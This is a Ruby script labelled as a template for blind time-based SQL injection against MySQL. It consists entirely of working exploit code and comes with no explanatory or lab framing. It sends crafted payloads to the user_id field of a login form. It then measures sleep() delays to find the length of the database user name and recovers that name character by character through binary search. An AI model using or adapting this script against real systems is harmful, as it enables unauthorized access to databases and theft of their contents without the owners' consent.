# encoding: UTF-8
# MySQL Blind Time-Based Template
require 'net/http'
require 'uri'

$url = 'http://target.com/login.php'
$ans = ''
$len = 0
$delay = 2

(1..100).each do |i|
    $query = "a' AND (SELECT * FROM (SELECT if (length(user())=#{i},sleep(#{$delay}),1))a) AND 'a'='a"
    start = Time.now
    res = Net::HTTP.post_form URI($url), {"user_id" => $query, "user_password" => "b"}
    finish = Time.now
    if finish - start > $delay
        $len = i
        break
    end
end

puts "length: #{$len}"

(1..$len).each do |i|
    l = 40
    r = 130

    while(l <= r)
        break if l == r
        mid = ((l + r) / 2)
        $query = "a' AND (SELECT * FROM (SELECT if (ascii(mid(user(),#{i},1))>#{mid},sleep(#{$delay}),1))a) AND 'a'='a"
        start = Time.now
        res = Net::HTTP.post_form URI($url), {"user_id" => $query, "user_password" => "b"}
        finish = Time.now
        if finish - start > $delay
            l = mid + 1
        else
            r = mid
        end
    end
    $ans += l.chr
    puts $ans
end
